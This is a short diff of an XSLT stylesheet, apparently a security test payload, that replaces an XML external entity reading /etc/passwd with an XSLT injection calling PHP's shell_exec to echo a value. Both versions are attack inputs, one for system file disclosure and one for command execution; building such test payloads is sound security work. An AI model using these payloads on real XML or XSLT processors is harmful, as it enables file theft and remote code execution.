@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
-<!DOCTYPE xsl:stylesheet [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<xsl:output method="html" />
 <xsl:template match="/">
-&xxe;
+  <xsl:value-of select="php:function('shell_exec','echo \'123\';')" />
 </xsl:template>
 </xsl:stylesheet>
